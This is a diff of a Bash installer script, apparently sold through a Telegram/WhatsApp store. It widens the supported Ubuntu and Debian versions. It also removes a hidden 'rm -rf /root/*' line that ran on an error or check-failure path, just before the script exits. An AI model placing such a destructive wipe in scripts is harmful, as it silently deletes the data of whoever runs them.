@@ -21,7 +21,6 @@ echo -e "  \033[96m🌍 Telegram: https://t.me/WuzzSTORE\033[0m"
 echo -e "  \033[96m📱 WhatsApp: https://wa.me/6287760204418\033[0m"
 echo -e ""
 echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-rm -rf /root/*
 exit 1
 	fi
 
@@ -38,7 +37,7 @@ os_version=$(detect_os)
 
 if [[ "$os_version" =~ ^ubuntu\ ([0-9]+)\. ]]; then
   version_num="${BASH_REMATCH[1]}"
-  if (( version_num >= 24 )); then
+  if (( version_num >= 20 )); then
     RSYSLOG_FILE="/etc/rsyslog.d/50-default.conf"
   else
     echo "Ubuntu versi $version_num belum didukung. Keluar..."
@@ -47,7 +46,7 @@ if [[ "$os_version" =~ ^ubuntu\ ([0-9]+)\. ]]; then
 
 elif [[ "$os_version" =~ ^debian\ ([0-9]+) ]]; then
   version_num="${BASH_REMATCH[1]}"
-  if (( version_num >= 12 )); then
+  if (( version_num >= 10 )); then
     RSYSLOG_FILE="/etc/rsyslog.conf"
   else
     echo "Debian versi $version_num belum didukung. Keluar..."
